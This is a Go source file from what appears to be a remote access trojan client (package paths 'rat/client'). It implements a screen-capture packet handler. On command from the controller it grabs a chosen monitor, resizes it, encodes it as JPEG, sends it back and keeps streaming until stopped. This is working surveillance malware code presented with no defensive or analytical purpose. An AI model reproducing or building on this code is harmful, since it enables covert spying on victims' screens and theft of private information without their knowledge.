package main

import (
	"bytes"
	"image/jpeg"
	"rat/client/screen"
	"rat/common"

	"github.com/disintegration/imaging"
)

var screenStream bool

type ScreenPacket struct {
	Scale   float32
	Monitor int
}

func (packet ScreenPacket) GetHeader() common.PacketHeader {
	return common.ScreenHeader
}

func (packet ScreenPacket) Read(c *Connection) error {
	run, err := c.ReadBool()
	if err != nil {
		return err
	}

	scale, err := c.ReadFloat()
	if err != nil {
		return err
	}

	monitor, err := c.ReadInt()
	if err != nil {
		return err
	}

	if run {
		// Dispatch one screen packet
		screenStream = false
		Queue <- ScreenPacket{scale, monitor}
		screenStream = run
	}

	return err
}

func (packet ScreenPacket) Write(c *Connection) error {
	screen.QueryMonitors()

	var w bytes.Buffer

	if packet.Monitor >= len(screen.Monitors) {
		packet.Monitor = 0
	}

	img := screen.Capture(screen.Monitors[packet.Monitor])

	if packet.Scale > 0 && packet.Scale < 1.0 {
		width := float32(img.Bounds().Max.X) * packet.Scale
		height := float32(img.Bounds().Max.Y) * packet.Scale

		img = imaging.Resize(img, int(width), int(height), imaging.NearestNeighbor)
	}

	jpeg.Encode(&w, img, &jpeg.Options{
		Quality: 75,
	})

	c.WriteInt(len(w.Bytes()))
	c.Write(w.Bytes())

	// Send another screen packet if we're still streaming
	if screenStream {
		go func() {
			Queue <- packet
		}()
	}

	return nil
}
